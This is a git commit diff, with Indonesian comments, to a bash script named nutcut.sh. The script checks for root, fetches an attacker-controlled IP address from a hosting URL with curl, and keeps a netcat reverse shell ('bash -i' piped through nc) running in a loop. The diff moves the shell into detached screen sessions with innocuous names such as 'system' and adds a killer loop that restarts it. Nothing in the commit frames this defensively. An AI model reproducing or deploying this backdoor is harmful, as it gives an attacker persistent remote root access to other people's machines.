0c5d4bec239765eb87175008e305ae533b16dc2c
root <root@WIN-NM1KJ97R1M2.localdomain>
2023-06-04 15:26:55 +0800

    perbaikan untuk linux

--- linux/nutcut.sh
+++ linux/nutcut.sh
@@ -1,17 +1,13 @@
 #!/bin/bash
+# wajib ada screen, jika tak ada install manual apt install screen
 # jangan beri nama file ini dengan nc atau netcat agar saat pgrep terhindar dari doble pid
 if [[ "$(id -u)" != "0" ]];then
  echo "    GAGAL !!!,kamu harus dalam mode root"
  exit 0
 fi
 
-matikanNc() {
-   # ini akan mematikan nc di tiap 120 detik
-   sleep 10
-   while [ "$(pgrep -f nc)" != "" ]; do sleep 120; echo "dimatikan"; kill -9 $(pgrep -f nc); done
-   echo "jalan"
-   exit 0
-}
+echo 'sleep 10;while [ "$(pgrep -f nc)" != "" ]; do sleep 120; echo "nc dimatikan"; kill -9 $(pgrep -f nc); done;exit 0' > /tmp/kill.sh
+chmod +x /tmp/kill.sh
 
 rm -rf /tmp/f
 
@@ -21,11 +17,17 @@ while true; do
 
  if [ "$(pgrep -f ./nc)" = "" ]; then
   IP=$(curl -s https://ibnusaja.nasihosting.com/temp.txt)
+  echo "masuk di true"
   # PORT="29399"
-  matikanNc > /dev/null 2> /dev/null &
-  cat /tmp/f | /bin/bash -i 2>&1 | nc $IP > /tmp/f
+  # nohup matikanNc > /dev/null 2> /dev/null &
+  echo "cat /tmp/f | /bin/bash -i 2>&1 | nc $IP > /tmp/f" > /tmp/nc.sh && chmod +x /tmp/nc.sh && sleep 2
+  screen -wipe
+  screen -AmdS system /tmp/nc.sh # run NC
+  screen -AmdS system2 /tmp/kill.sh 
+ else
+  echo "ke skip karena nc sudah jalan"
  fi
 
- # echo "sudah jalan"
- sleep 30
+ echo "sudah jalan"
+ sleep 3
 done
